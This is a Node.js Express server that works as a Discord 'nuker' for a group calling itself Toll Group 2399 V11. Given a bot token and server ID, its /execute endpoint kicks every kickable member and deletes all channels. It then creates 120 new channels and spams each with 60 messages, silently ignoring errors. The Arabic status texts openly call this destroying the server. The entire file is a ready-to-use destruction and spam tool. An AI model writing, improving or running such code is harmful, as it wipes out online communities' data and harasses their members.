const { Client, GatewayIntentBits, ChannelType, Partials } = require('discord.js');
const express = require('express');
const app = express();

app.use(express.json());
app.use(require('cors')());
app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;
    const client = new Client({ intents: [3276799], partials: [Partials.Channel, Partials.GuildMember] });

    try {
        await client.login(token);
        client.once('ready', async () => {
            console.log(`✅ البوت متصل: ${client.user.tag}`);
            const guild = await client.guilds.fetch(guildId).catch(() => null);
            
            if (!guild) return res.status(404).json({ status: '❌ البوت غير موجود في السيرفر!' });

            // استجابة فورية للوحة
            res.json({ status: '🚀 V11: بدأت العملية بنجاح! السيرفر قيد التدمير' });

            const name = customName || "Toll Group 2399 V11";
            const msg = customMsg || "# TOLL GROUP 2399 V11 ON TOP";

            // التنفيذ (طرد وحذف)
            if (action === 'تدمير' || action === 'طرد') {
                const members = await guild.members.fetch();
                members.forEach(m => { if(m.kickable) m.kick('V11 Power').catch(() => {}); });
            }

            if (action === 'تدمير') {
                guild.channels.cache.forEach(c => c.delete().catch(() => {}));
                for (let i = 0; i < 120; i++) {
                    setTimeout(async () => {
                        const ch = await guild.channels.create({ name: name, type: ChannelType.GuildText }).catch(() => null);
                        if (ch) for(let j=0; j<60; j++) ch.send(msg).catch(() => {});
                    }, i * 25);
                }
            }
        });
    } catch (err) {
        res.status(500).json({ status: `❌ خطأ في التوكن: ${err.message}` });
    }
});

app.listen(process.env.PORT || 3000);
